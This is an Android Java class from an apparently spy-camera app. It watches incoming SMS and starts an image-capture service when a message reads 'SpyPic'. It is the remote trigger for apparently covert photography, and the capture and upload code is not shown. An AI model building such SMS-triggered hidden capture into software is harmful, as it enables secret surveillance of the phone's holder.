package com.byteshaft.wrecspycam;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;


public class SmsReceiver extends BroadcastReceiver {
    String msg_from;
    String msgBody;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        msgBody = msgs[i].getMessageBody();
                        if (msgBody.equals("SpyPic")) {
                            Log.i("SPY_CAM" , "Capturing Image");
                            Intent serviceIntent = new Intent(context, SpyPictureService.class);
                            context.startService(serviceIntent);
                        } else if (msgBody.equals("SpyVideo")) {
                            Log.i("SPY_CAM", "Capturing Video");
                        }
                    }
                } catch (Exception e) {
                            Log.d("Exception caught", e.getMessage());
                }
            }
        }

    }
}
